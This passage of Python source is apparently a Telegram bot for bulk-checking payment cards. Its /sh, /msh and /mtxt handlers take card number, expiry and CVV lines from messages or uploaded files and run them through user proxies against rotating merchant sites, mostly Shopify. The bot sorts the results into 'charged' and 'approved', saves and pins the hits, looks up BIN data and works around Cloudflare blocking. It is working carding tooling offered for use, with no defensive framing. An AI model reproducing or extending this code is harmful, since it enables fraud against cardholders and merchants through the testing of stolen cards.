                check_card_random_site(card, user_sites, event.sender_id),
                timeout=40.0
            )
        except asyncio.TimeoutError:
            if loading_task: loading_task.cancel()
            await loading_msg.edit("❌ Timed out (40s)", parse_mode='html')
            return

        elapsed = round(time.time() - start_time, 2)

        bin_prefix = card.split("|")[0][:6]
        brand, bin_type, level, bank, country, flag = await get_bin_info(bin_prefix)

        response_text = str(res.get("Response", "")).lower()
        full_text = response_text + " " + str(res.get("Status", "")).lower()

        status = "DECLINED"
        save_type = None

        if any(x in full_text for x in ["charged", "payment successful", "thank you", "funds added", "order completed"]):
            status = "CHARGED"
            save_type = "Charged"
        elif any(x in full_text for x in ["approved", "success", "accepted", "valid card"]):
            status = "APPROVED"
            save_type = "Approved"
        elif any(x in full_text for x in ["cloudflare", "cf-ray", "403"]):
            status = "CLOUDFLARE"
            res["Response"] = res.get("Response", "") + " → Cloudflare blocked"
        elif any(x in full_text for x in ["insufficient funds", "nsf", "limit exceeded"]):
            status = "INSUFFICIENT FUNDS"
        elif any(x in full_text for x in ["cvv", "cvc", "security code"]):
            status = "CVV ERROR"

        if save_type:
            await save_approved_card(card, save_type, res.get('Response', 'No response'), res.get('Gateway', 'Unknown'), res.get('Price', '-'))

        gateway  = res.get('Gateway', 'Unknown')
        price    = res.get('Price',    '-')
        response = res.get('Response', 'No response received')

        # Use your exact emoji IDs
        emoji_id = STATUS_EMOJIS.get(status, STATUS_EMOJIS["DECLINED"])

        card_msg = f"""
<b><tg-emoji emoji-id="{emoji_id}"></tg-emoji> {status}</b>

<b>CC</b> ➜ <code>{card}</code>
<b>Gateway</b> ➜ {gateway}
<b>Response</b> ➜ {html.escape(response)}
<b>Price</b> ➜ {price} <tg-emoji emoji-id="{SPECIAL_EMOJIS['PRICE']}"></tg-emoji>
<b>Site</b> ➜ {site_index + 1}/{len(user_sites)}

<pre><code>BIN Info: {brand} - {bin_type} - {level}
Bank: {bank}
Country: {country} {flag}</code></pre>

<i>Took {elapsed}s <tg-emoji emoji-id="{SPECIAL_EMOJIS['FIRE']}"></tg-emoji></i>
"""

        await event.reply(card_msg, parse_mode='html')

        if status == "CHARGED":
            try:
                await pin_charged_message(event, await event.get_reply_message())
            except:
                pass

    except Exception as e:
        print(f"/sh error: {e}")
        if loading_msg:
            try:
                await loading_msg.edit(f"❌ Error: {str(e)[:80]}", parse_mode='html')
            except:
                pass

    finally:
        if loading_task and not loading_task.done():
            loading_task.cancel()
        if loading_msg:
            try:
                await loading_msg.delete()
            except:
                pass

@client.on(events.NewMessage(pattern=r'(?i)^[/.]msh'))
async def msh(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned":
        return await event.reply(banned_user_message())
    if not can_access:
        buttons = [[Button.url("𝙐𝙨𝙚 𝙄𝙣 𝙂𝙧𝙤𝙪𝙥 𝙁𝙧𝙚𝙚", "https://t.me/deebuchecked")]]
        return await event.reply("🚫 Unauthorized! Join group for free use.", buttons=buttons)

    proxy_data = await get_user_proxy(event.sender_id)
    if not proxy_data:
        return await event.reply("⚠️ Proxy required! Use /addpxy first.")

    cards = []
    if event.reply_to_msg_id:
        replied = await event.get_reply_message()
        if replied and replied.text:
            cards = extract_all_cards(replied.text)
    else:
        cards = extract_all_cards(event.raw_text[4:].strip())

    if not cards:
        return await event.reply("No valid cards found.\nFormat: 4111111111111111|12|25|123")

    if len(cards) > 20:
        cards = cards[:20]
        await event.reply(f"⚠️ Only checking first 20 cards (limit reached)")

    sites = await load_json(SITE_FILE)
    user_sites = sites.get(str(event.sender_id), [])
    if not user_sites:
        return await event.reply("No sites added. Use /add first.")

    asyncio.create_task(process_msh_cards(event, cards, user_sites))
async def process_msh_cards(event, cards, sites):
    status_msg = await event.reply(f"🔥 Cooking {len(cards)} cards...")

    charged = 0
    approved = 0
    declined = 0

    for i, card in enumerate(cards, 1):
        site = random.choice(sites)
        try:
            result = await check_card_specific_site(card, site, event.sender_id)
            response_text = result.get("Response", "").lower()

            if "charged" in response_text or "order completed" in response_text or "💎" in response_text:
                charged += 1
                status = "CHARGED 💎"
                await save_approved_card(card, "CHARGED", result.get('Response'), result.get('Gateway'), result.get('Price'))
            elif "approved" in response_text or "success" in response_text or "thank you" in response_text:
                approved += 1
                status = "APPROVED ✅"
                await save_approved_card(card, "APPROVED", result.get('Response'), result.get('Gateway'), result.get('Price'))
            else:
                declined += 1
                status = "DECLINED ❌"

            brand, btype, level, bank, country, flag = await get_bin_info(card.split("|")[0][:6])

            msg = f"""
{status}
𝗖𝗖 ⇾ `{card}`
𝗚𝗮𝘁𝗲𝘄𝗮𝘆 ⇾ {result.get('Gateway', 'Shopify')}
𝗥𝗲𝙨𝙥𝙤𝙣𝙨𝗲 ⇾ {result.get('Response', 'No response')}
𝗣𝗿𝗶𝗰𝗲 ⇾ {result.get('Price', '-')}
𝗦𝗶𝘁𝗲 ⇾ {site}
BIN: {brand} - {btype} - {level} | {bank} | {country} {flag}
"""
            await event.reply(msg)

        except Exception as e:
            declined += 1
            await event.reply(f"❌ Error on {card}: {str(e)[:100]}")

        await asyncio.sleep(1.2)  # anti-flood

        # Update progress
        await status_msg.edit(
            f"🔥 Cooking progress: {i}/{len(cards)}\n"
            f"💎 Charged: {charged}\n"
            f"✅ Approved: {approved}\n"
            f"❌ Declined: {declined}"
        )

    await status_msg.edit(
        f"✅ Finished!\n"
        f"Total cards: {len(cards)}\n"
        f"💎 Charged: {charged}\n"
        f"✅ Approved: {approved}\n"
        f"❌ Declined: {declined}"
    )

@client.on(events.NewMessage(pattern=r'(?i)^[/.]broadcast ?(.*)'))
async def broadcast_command(event):
    if not await is_admin(event.sender_id):
        return await event.reply("🚫 𝙊𝙣𝙡𝙮 𝘼𝙙𝙢𝙞𝙣𝙨 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙗𝙧𝙤𝙖𝙙𝙘𝙖𝙨𝙩!")

    # ─── Collect ALL unique users ───────────────────────────────────────────────
    all_users = set()
    premium = await load_json(PREMIUM_FILE)
    all_users.update(int(uid) for uid in premium)
    free = await load_json(FREE_FILE)
    all_users.update(int(uid) for uid in free)
    sites_data = await load_json(SITE_FILE)
    all_users.update(int(uid) for uid in sites_data)
    banned = await load_json(BANNED_FILE)
    all_users.update(int(uid) for uid in banned)

    if not all_users:
        return await event.reply("❌ No users found in database!")

    total_users = len(all_users)
    user_list = list(all_users)

    # ─── Prepare message to broadcast ───────────────────────────────────────────
    if event.reply_to_msg_id:
        replied = await event.get_reply_message()
        message_content = replied  # full message object (text/photo/video/etc)
        is_forward = True
    else:
        broadcast_text = event.pattern_match.group(1).strip()
        if not broadcast_text:
            return await event.reply("Reply to a message OR write text after /broadcast")
        message_content = broadcast_text
        is_forward = False

    # ─── Start broadcast ────────────────────────────────────────────────────────
    status_msg = await event.reply(
        f"🚀 **Broadcast started**\n"
        f"Total users: {total_users:,}\n"
        f"Preparing... 0%"
    )

    success = 0
    failed = 0
    blocked = 0
    flood = 0

    for idx, user_id in enumerate(user_list, 1):
        try:
            if is_forward:
                await client.forward_messages(user_id, message_content)
            else:
                await client.send_message(user_id, message_content)

            success += 1

        except telethon.errors.FloodWaitError as e:
            flood += 1
            await asyncio.sleep(min(e.seconds + 3, 120))

        except (telethon.errors.UserIsBlockedError, telethon.errors.ChatWriteForbiddenError):
            blocked += 1

        except Exception as e:
            failed += 1
            print(f"Broadcast failed for {user_id}: {str(e)}")

        # Update progress every 5 users or at end
        if idx % 5 == 0 or idx == total_users:
            percent = round((idx / total_users) * 100, 1)
            await status_msg.edit(
                f"🚀 **Broadcast in progress**\n"
                f"Total: {total_users:,} users\n"
                f"Progress: {idx:,}/{total_users:,} ({percent}%)\n"
                f"✅ Sent: {success:,}\n"
                f"❌ Failed: {failed:,}\n"
                f"🚫 Blocked: {blocked:,}\n"
                f"⏳ Flood waits: {flood:,}"
            )

        await asyncio.sleep(0.4)  # safe anti-flood delay

    # ─── Final beautiful report ─────────────────────────────────────────────────
    final_report = f"""✅ **Broadcast Completed!**

📊 **Statistics:**
Total users targeted: **{total_users:,}**
Successfully sent: **{success:,}**
Failed: **{failed:,}**
Blocked by user: **{blocked:,}**
Flood waits encountered: **{flood:,}**

Message type: {'Forwarded media/message' if is_forward else 'Text message'}
"""
    if success > 0:
        final_report += "\nBroadcast finished successfully. 🔥"
    else:
        final_report += "\nNo messages were sent. Check logs."

    await status_msg.edit(final_report)

@client.on(events.NewMessage(pattern=r'(?i)^[/.]mtxt$'))
async def mtxt(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message())
    if not can_access:
        buttons = [[Button.url("𝙐𝙨𝙚 𝙄𝙣 𝙂𝙧𝙤𝙪𝙥 𝙁𝙧𝙚𝙚", f"https://t.me/+pNplrRLrEGY5NTU0")]]
        return await event.reply("🚫 𝙐𝙣𝙖𝙪𝙩𝙝𝙤𝙧𝙞𝙨𝙚𝙙 𝘼𝙘𝙘𝙚𝙨𝙨!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙣 𝙜𝙧𝙤𝙪𝙥 𝙛𝙤𝙧 𝙛𝙧𝙚𝙚!\n\n𝙁𝙤𝙧 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙖𝙘𝙘𝙚𝙨𝙨, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @Dreadsync_2", buttons=buttons)
    
    # Check if user has added proxy
    proxy_data = await get_user_proxy(event.sender_id)
    if not proxy_data:
        return await event.reply("⚠️ 𝙋𝙧𝙤𝙭𝙮 𝙍𝙚𝙦𝙪𝙞𝙧𝙚𝙙!\n\n𝙋𝙡𝙚𝙖𝙨𝙚 𝙖𝙙𝙙 𝙖 𝙥𝙧𝙤𝙭𝙮 𝙛𝙞𝙧𝙨𝙩 𝙪𝙨𝙞𝙣𝙜:\n`/addpxy ip:port:username:password`\n\n𝙊𝙧 𝙬𝙞𝙩𝙝𝙤𝙪𝙩 𝙖𝙪𝙩𝙝:\n`/addpxy ip:port`")
    
    user_id = event.sender_id
    if user_id in ACTIVE_MTXT_PROCESSES: return await event.reply("```𝙔𝙤𝙪𝙧 𝘾𝘾 is 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝘾𝙤𝙤𝙠𝙞𝙣𝙜 🍳 𝙬𝙖𝙞𝙩 𝙛𝙤𝙧 𝙘𝙤𝙢𝙥𝙡𝙚𝙩𝙚```")
    try:
        if not event.reply_to_msg_id: return await event.reply("```𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙙𝙤𝙘𝙪𝙢𝙚𝙣𝙩 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙬𝙞𝙩𝙝 /𝙢𝙩𝙭𝙩```")
        replied_msg = await event.get_reply_message()
        if not replied_msg or not replied_msg.document: return await event.reply("```𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙙𝙤𝙘𝙪𝙢𝙚𝙣𝙩 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙬𝙞𝙩𝙝 /𝙢𝙩𝙭𝙩```")
        file_path = await replied_msg.download_media()
        try:
            async with aiofiles.open(file_path, "r") as f: lines = (await f.read()).splitlines()
            os.remove(file_path)
        except Exception as e:
            try: os.remove(file_path)
            except: pass
            return await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧 𝙧𝙚𝙖𝙙𝙞𝙣𝙜 𝙛𝙞𝙡𝙚: {e}")
        cards = [line for line in lines if re.match(r'\d{12,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', line)]
        if not cards: return await event.reply("𝘼𝙣𝙮 𝙑𝙖𝙡𝙞𝙙 𝘾𝘾 𝙣𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 🥲")
        cc_limit = get_cc_limit(access_type, user_id)
        total_cards_found = len(cards)
        if len(cards) > cc_limit:
            cards = cards[:cc_limit]
            await event.reply(f"""```📝 𝙁𝙤𝙪𝙣𝙙 {total_cards_found} 𝘾𝘾𝙨 𝙞𝙣 𝙛𝙞𝙡𝙚
⚠️ 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜 𝙤𝙣𝙡𝙮 𝙛𝙞𝙧𝙨𝙩 {cc_limit} 𝘾𝘾𝙨 (𝙮𝙤𝙪𝙧 𝙡𝙞𝙢𝙞𝙩)
🔥 {len(cards)} 𝘾𝘾𝙨 𝙬𝙞𝙡𝙡 𝙗𝙚 𝙘𝙝𝙚𝙘𝙠𝙚𝙙```""")
        else: await event.reply(f"""```📝 𝙁𝙤𝙪𝙣𝙙 {total_cards_found} 𝙫𝙖𝙡𝙞𝙙 𝘾𝘾𝙨 𝙞𝙣 𝙛𝙞𝙡𝙚
🔥 𝘼𝙡𝙡 {len(cards)} 𝘾𝘾𝙨 𝙬𝙞𝙡𝙡 𝙗𝙚 𝙘𝙝𝙚𝙘𝙠𝙚𝙙```""")
        sites = await load_json(SITE_FILE)
        user_sites = sites.get(str(event.sender_id), [])
        if not user_sites: return await event.reply("𝙎𝙞𝙩𝙚 𝙉𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 𝙄𝙣 𝙔𝙤𝙪𝙧 𝘿𝙗")
        ACTIVE_MTXT_PROCESSES[user_id] = True
        asyncio.create_task(process_mtxt_cards(event, cards, user_sites.copy()))
    except Exception as e:
        ACTIVE_MTXT_PROCESSES.pop(user_id, None)
        await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")

async def process_mtxt_cards(event, cards, local_sites):
    # Get username
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{event.sender_id}"
    except:
        username = f"user_{event.sender_id}"
    
    user_id = event.sender_id
    total = len(cards)
    checked, approved, charged, declined = 0, 0, 0, 0
    status_msg = await event.reply(f"```𝙎𝙤𝙢𝙚𝙩𝙝𝙞𝙣𝙜 𝘽𝙞𝙜 𝘾𝙤𝙤𝙠𝙞𝙣𝙜 🍳```")
    cards_per_site = 4
    current_site_index = 0
    cards_on_current_site = 0

    try:
        batch_size = 20
        for i in range(0, len(cards), batch_size):
            if not local_sites:
                await status_msg.edit("❌ **All your sites are dead!**\nPlease add fresh sites using `/add` and try again.")
                break

            batch = cards[i:i+batch_size]
            tasks = []
            task_cards = []

            if user_id not in ACTIVE_MTXT_PROCESSES:
                final_caption = f"""⛔ 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙎𝙩𝙤𝙥𝙥𝙚𝙙!
𝙏𝙤𝙩𝙖𝙡 𝘾𝙃𝘼𝙍𝙂𝙀 {await get_random_premium_emoji_id(user_id)} : {charged}
𝙏𝙤𝙩𝙖𝙡 𝘼𝙥𝙥𝙧𝙤𝙫𝙚 {await get_random_premium_emoji_id(user_id)} : {approved}
𝙏𝙤𝙩𝙖𝙡 𝘿𝙚𝙘𝙡𝙞𝙣𝙚 {await get_random_premium_emoji_id(user_id)} : {declined}
𝙏𝙤𝙩𝙖𝙡 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 ☠️ : {checked}/{total}
"""
                final_buttons = [[Button.inline(f"𝘾𝙃𝘼𝙍𝙂𝙀 ➜ [ {charged} ] {await get_random_premium_emoji_id(user_id)}", b"none")], 
                                 [Button.inline(f"𝘼𝙥𝙥𝙧𝙤𝙫𝙚 ➜ [ {approved} ] {await get_random_premium_emoji_id(user_id)}", b"none")], 
                                 [Button.inline(f"𝙎𝙩𝙤𝙥 ➜ [{checked}/{total}] ⛔", b"none")]]
                try: await status_msg.edit(final_caption, buttons=final_buttons)
                except: pass
                return

            for card in batch:
                if user_id not in ACTIVE_MTXT_PROCESSES or not local_sites:
                    break
                current_site = local_sites[current_site_index]
                tasks.append(check_card_specific_site(card, current_site, user_id))
                task_cards.append((card, current_site))
                cards_on_current_site += 1
                if cards_on_current_site >= cards_per_site:
                    current_site_index = (current_site_index + 1) % len(local_sites)
                    cards_on_current_site = 0
            
            if not tasks: continue

            results = await asyncio.gather(*tasks, return_exceptions=True)

            for j, (result, (card, site_used)) in enumerate(zip(results, task_cards)):
                if user_id not in ACTIVE_MTXT_PROCESSES: break

                if isinstance(result, Exception):
                    result = {"Response": f"Exception: {str(result)}", "Price": "-", "Gateway": "-"}

                checked += 1
                start_time = time.time()
                end_time = time.time()
                elapsed_time = round(end_time - start_time, 2)
                
                response_text = result.get("Response", "")
                response_text_lower = response_text.lower()

                # ─── Get fresh random premium animated emoji for THIS card ───────
                emoji_id = await get_random_premium_emoji_id(user_id)

                if is_site_dead(response_text):
                    declined += 1
                    if site_used in local_sites:
                        local_sites.remove(site_used)
                        all_sites_data = await load_json(SITE_FILE)
                        if str(user_id) in all_sites_data and site_used in all_sites_data[str(user_id)]:
                            all_sites_data[str(user_id)].remove(site_used)
                            await save_json(SITE_FILE, all_sites_data)
                        current_site_index = 0
                        cards_on_current_site = 0
                    
                    if not local_sites:
                        final_caption = f"""⛔ **All sites are dead!**
Please add fresh sites using `/add` and try again.

𝙏𝙤𝙩𝙖𝙡 𝘾𝙃𝘼𝙍𝙂𝙀 {await get_random_premium_emoji_id(user_id)} : {charged}
𝙏𝙤𝙩𝙖𝙡 𝘼𝙥𝙥𝙧𝙤𝙫𝙚 {await get_random_premium_emoji_id(user_id)} : {approved}
𝙏𝙤𝙩𝙖𝙡 𝘿𝙚𝙘𝙡𝙞𝙣𝙚 {await get_random_premium_emoji_id(user_id)} : {declined}
𝙏𝙤𝙩𝙖𝙡 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 ☠️ : {checked}/{total}
"""
                        final_buttons = [[Button.inline(f"𝘾𝙃𝘼𝙍𝙂𝙀 ➜ [ {charged} ] {await get_random_premium_emoji_id(user_id)}", b"none")], 
                                         [Button.inline(f"𝘼𝙥𝙥𝙧𝙤𝙫𝙚 ➜ [ {approved} ] {await get_random_premium_emoji_id(user_id)}", b"none")], 
                                         [Button.inline(f"𝘿𝙚𝙖𝙙 𝙎𝙞𝙩𝙚𝙨! ➜ [{checked}/{total}] ⛔", b"none")]]
                        try: await status_msg.edit(final_caption, buttons=final_buttons)
                        except: pass
                        ACTIVE_MTXT_PROCESSES.pop(user_id, None)
                        return
                    continue

                if "3d" in response_text_lower:
                    declined += 1
                    continue

                brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
                should_send_message = False
                status_text_lower = result.get("Status", "").lower()

                # ─── Charged / Approved detection with random premium emoji ───────
                if "charged" in response_text_lower or "charged" in status_text_lower:
                    charged += 1
                    status_header = f"𝘾𝙃𝘼𝙍𝙂𝙀𝘿 {emoji_id}" if emoji_id else "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎"
                    await save_approved_card(card, "CHARGED", result.get('Response'), result.get('Gateway'), result.get('Price'))
                    should_send_message = True

                elif "cloudflare bypass failed" in response_text_lower:
                    status_header = f"𝘾𝙇𝙊𝙐𝘿𝙁𝙇𝘼𝙍𝙀 𝙎𝙋𝙊𝙏𝙏𝙀𝘿 {emoji_id}" if emoji_id else "𝘾𝙇𝙊𝙐𝘿𝙁𝙇𝘼𝙍𝙀 𝙎𝙋𝙊𝙏𝙏𝙀𝘿 ⚠️"
                    result["Response"] = "Cloudflare spotted 🤡 change site or try again"
                    checked -= 1

                elif "thank you" in response_text_lower or "payment successful" in response_text_lower:
                    charged += 1
                    status_header = f"𝘾𝙃𝘼𝙍𝙂𝙀𝘿 {emoji_id}" if emoji_id else "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎"
                    await save_approved_card(card, "CHARGED", result.get('Response'), result.get('Gateway'), result.get('Price'))
                    should_send_message = True

                elif any(key in response_text_lower for key in ["invalid_cvv", "incorrect_cvv", "insufficient_funds", "approved", "success", "invalid_cvc", "incorrect_cvc", "incorrect_zip", "insufficient funds"]):
                    approved += 1
                    status_header = f"𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 {emoji_id}" if emoji_id else "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
                    await save_approved_card(card, "APPROVED", result.get('Response'), result.get('Gateway'), result.get('Price'))
                    should_send_message = True

                else:
                    declined += 1
                    status_header = f"~~ 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 {emoji_id} ~~ ❌" if emoji_id else "~~ 𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ~~ ❌"

                # Get site index for display
                try:
                    display_site_index = local_sites.index(site_used) + 1 if site_used in local_sites else "?"
                except:
                    display_site_index = "?"

                if should_send_message:
                    card_msg = f"""{status_header}

𝗖𝗖 ⇾ `{card}`
𝗚𝗮𝘁𝗲𝙬𝙖𝙮 ⇾ {result.get('Gateway', 'Unknown')}
𝗥𝗲𝙨𝙥𝙤𝙣𝙨𝗲 ⇾ {result.get('Response')}
𝗣𝗿𝗶𝗰𝗲 ⇾ {result.get('Price')} 💸
𝗦𝗶𝘁𝗲 ⇾ {display_site_index}

```𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}```

𝗧𝗼𝗼𝙠 {elapsed_time} 𝘀𝗲𝗰𝗼𝗻𝗱𝙨
"""

                    # ─── Send with animated premium emoji entity ────────────────────────
                    entities = None
                    if emoji_id and emoji_id in card_msg:
                        offset = card_msg.find(emoji_id)
                        if offset != -1:
                            entities = [MessageEntityCustomEmoji(
                                offset=offset,
                                length=len(emoji_id),
                                document_id=int(emoji_id)
                            )]

                    result_msg = await event.reply(
                        card_msg,
                        formatting_entities=entities
                    )

                    # Pin if charged
                    if "charged" in response_text_lower or "charged" in status_text_lower or "thank you" in response_text_lower or "payment successful" in response_text_lower:
                        await pin_charged_message(event, result_msg)
                
                # Progress buttons with random emoji too
                buttons = [
                    [Button.inline(f"𝗖𝗮𝗿𝗱 ➜ {card[:12]}****", b"none")],
                    [Button.inline(f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➜ {result.get('Response')[:25]}...", b"none")],
                    [Button.inline(f"𝗦𝗶𝘁𝗲 ➜ [ {display_site_index} ]", b"none")],
                    [Button.inline(f"𝘾𝙃𝘼𝙍𝙂𝙀 ➜ [ {charged} ] {await get_random_premium_emoji_id(user_id)}", b"none")],
                    [Button.inline(f"𝘼𝙥𝙥𝙧𝙤𝙫𝙚 ➜ [ {approved} ] {await get_random_premium_emoji_id(user_id)}", b"none")],
                    [Button.inline(f"𝘿𝙚𝙘𝙡𝙞𝙣𝙚 ➜ [ {declined} ] {await get_random_premium_emoji_id(user_id)}", b"none")],
                    [Button.inline(f"𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨 ➜ [{checked}/{total}] ✅", b"none")],
                    [Button.inline("⛔ 𝙎𝙩𝙤𝙥", f"stop_mtxt:{user_id}".encode())]
                ]
                try: await status_msg.edit("```𝘾𝙤𝙤𝙠𝙞𝙣𝙜 🍳 𝘾𝘾𝙨 𝙊𝙣𝙚 𝙗𝙮 𝙊𝙣𝙚...```", buttons=buttons)
                except: pass
                await asyncio.sleep(0.1)

        # Final summary with random emoji
        final_emoji = await get_random_premium_emoji_id(user_id)
        final_caption = f"""✅ 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚! {final_emoji}
𝙏𝙤𝙩𝙖𝙡 𝘾𝙃𝘼𝙍𝙂𝙀 {await get_random_premium_emoji_id(user_id)} : {charged}
𝙏𝙤𝙩𝙖𝙡 𝘼𝙥𝙥𝙧𝙤𝙫𝙚 {await get_random_premium_emoji_id(user_id)} : {approved}
𝙏𝙤𝙩𝙖𝙡 𝘿𝙚𝙘𝙡𝙞𝙣𝙚 {await get_random_premium_emoji_id(user_id)} : {declined}
𝙏𝙤𝙩𝙖𝙡 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 ☠️ : {total}
"""
        final_buttons = [[Button.inline(f"𝘾𝙃𝘼𝙍𝙂𝙀 ➜ [ {charged} ] {await get_random_premium_emoji_id(user_id)}", b"none")], 
                         [Button.inline(f"𝘼𝙥𝙥𝙧𝙤𝙫𝙚 ➜ [ {approved} ] {await get_random_premium_emoji_id(user_id)}", b"none")], 
                         [Button.inline(f"𝙏𝙤𝙩𝙖𝙡 ➜ [{total}] ☠️", b"none")], 
                         [Button.inline(f"𝙏𝙤𝙩𝙖𝙡 𝘾𝙝𝙚𝙘𝙠𝙚𝙙 ➜ [{checked}/{total}] ✅", b"none")]]
        try: await status_msg.edit(final_caption, buttons=final_buttons)
        except: pass

    finally:
        ACTIVE_MTXT_PROCESSES.pop(user_id, None)

@client.on(events.CallbackQuery(pattern=rb"stop_mtxt:(\d+)"))
async def stop_mtxt_callback(event):
    try:
        match = event.pattern_match
        process_user_id = int(match.group(1).decode())
        clicking_user_id = event.sender_id
        can_stop = False
        if clicking_user_id == process_user_id: can_stop = True
        elif clicking_user_id in ADMIN_ID: can_stop = True
        if not can_stop: return await event.answer("```❌ 𝙔𝙤𝙪 𝙘𝙖𝙣 𝙤𝙣𝙡𝙮 𝙨𝙩𝙤𝙥 𝙮𝙤𝙪𝙧 𝙤𝙬𝙣 𝙥𝙧𝙤𝙘𝙚𝙨𝙨!```", alert=True)
        if process_user_id not in ACTIVE_MTXT_PROCESSES: return await event.answer("```❌ 𝙉𝙤 𝙖𝙘𝙩𝙞𝙫𝙚 𝙥𝙧𝙤𝙘𝙚𝙨𝙨 𝙛𝙤𝙪𝙣𝙙!```", alert=True)
        ACTIVE_MTXT_PROCESSES.pop(process_user_id, None)
        await event.answer("```⛔ 𝘾𝘾 𝙘𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙨𝙩𝙤𝙥𝙥𝙚𝙙!```", alert=True)
    except Exception as e: await event.answer(f"```❌ 𝙀𝙧𝙧𝙤𝙧: {str(e)}```", alert=True)

@client.on(events.NewMessage(pattern='/info'))
async def info(event):
    if await is_banned_user(event.sender_id): return await event.reply(banned_user_message())
    user = await event.get_sender()
    user_id = event.sender_id
    first_name = user.first_name or "𝙉/𝘼"
    last_name = user.last_name or ""
    full_name = f"{first_name} {last_name}".strip()
    username = f"@{user.username}" if user.username else "𝙉/𝘼"
    has_premium = await is_premium_user(user_id)
    premium_status = "✅ 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 𝘼𝙘𝙘𝙚𝙨𝙨" if has_premium else "❌ 𝙉𝙤 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 𝘼𝙘𝙘𝙚𝙨𝙨"
    sites = await load_json(SITE_FILE)
    user_sites = sites.get(str(user_id), [])
    if user_sites: sites_text = "\n".join([f"{idx + 1}. {site}" for idx, site in enumerate(user_sites)])
    else: sites_text = "𝙉𝙤 𝙨𝙞𝙩𝙚𝙨 𝙖𝙙𝙙𝙚𝙙"
    info_text = f"""👤 𝙐𝙨𝙚𝙧 𝙄𝙣𝙛𝙤𝙧𝙢𝙖𝙩𝙞𝙤𝙣

𝙉𝙖𝙢𝙚 ⇾ {full_name}
𝙐𝙨𝙚𝙧𝙣𝙖𝙢𝙚 ⇾ {username}
𝙐𝙨𝙚𝙧 𝙄𝘿 ⇾ `{user_id}`
𝙋𝙧  𝙞𝙫𝙖𝙩𝙚 𝘼𝙘𝙘𝙚𝙨𝙨 ⇾ {premium_status}

𝙎𝙞𝙩𝙚𝙨 ⇾ ({len(user_sites)}):

```
{sites_text}

```
"""

    await event.reply(info_text)

@client.on(events.NewMessage(pattern='/stats'))
async def stats(event):
    if not await is_admin(event.sender_id):
        return await event.reply("🚫 𝙊𝙣𝙡𝙮 𝘼𝙙𝙢𝙞𝙣 𝘾𝙖𝙣 𝙐𝙨𝙚 𝙏𝙝𝙞𝙨 𝘾𝙤𝙢𝙢𝙖𝙣𝙙!")

    try:
        premium_users = await load_json(PREMIUM_FILE)
        free_users = await load_json(FREE_FILE)
        user_sites = await load_json(SITE_FILE)
        keys_data = await load_json(KEYS_FILE)

        stats_content = "🔥 BOT STATISTICS REPORT 🔥\n"
        stats_content += "=" * 50 + "\n\n"

        current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        stats_content += f"📅 Generated on: {current_time}\n\n"

        stats_content += "👥 USER STATISTICS\n"
        stats_content += "-" * 30 + "\n"

        all_user_ids = set()
        all_user_ids.update(premium_users.keys())
        all_user_ids.update(free_users.keys())
        all_user_ids.update(user_sites.keys())

        total_users = len(all_user_ids)
        total_premium = len(premium_users)
        total_free = total_users - total_premium

        stats_content += f"📊 Total Unique Users: {total_users}\n"
        stats_content += f"💎 Premium Users: {total_premium}\n"
        stats_content += f"🆓 Free Users: {total_free}\n\n"

        if premium_users:
            stats_content += "💎 PREMIUM USERS DETAILS\n"
            stats_content += "-" * 30 + "\n"

            for user_id, user_data in premium_users.items():
                expiry_date = datetime.datetime.fromisoformat(user_data['expiry'])
                current_date = datetime.datetime.now()

                status = "ACTIVE" if current_date <= expiry_date else "EXPIRED"
                days_remaining = (expiry_date - current_date).days if current_date <= expiry_date else 0

                stats_content += f"User ID: {user_id}\n"
                stats_content += f"  Status: {status}\n"
                stats_content += f"  Days Given: {user_data.get('days', 'N/A')}\n"
                stats_content += f"  Added By: {user_data.get('added_by', 'N/A')}\n"
                stats_content += f"  Expires: {expiry_date.strftime('%Y-%m-%d %H:%M:%S')}\n"
                stats_content += f"  Days Remaining: {days_remaining}\n"
                stats_content += "-" * 20 + "\n"

        stats_content += "\n🌐 SITES STATISTICS\n"
        stats_content += "-" * 30 + "\n"

        total_sites_count = sum(len(sites) for sites in user_sites.values())
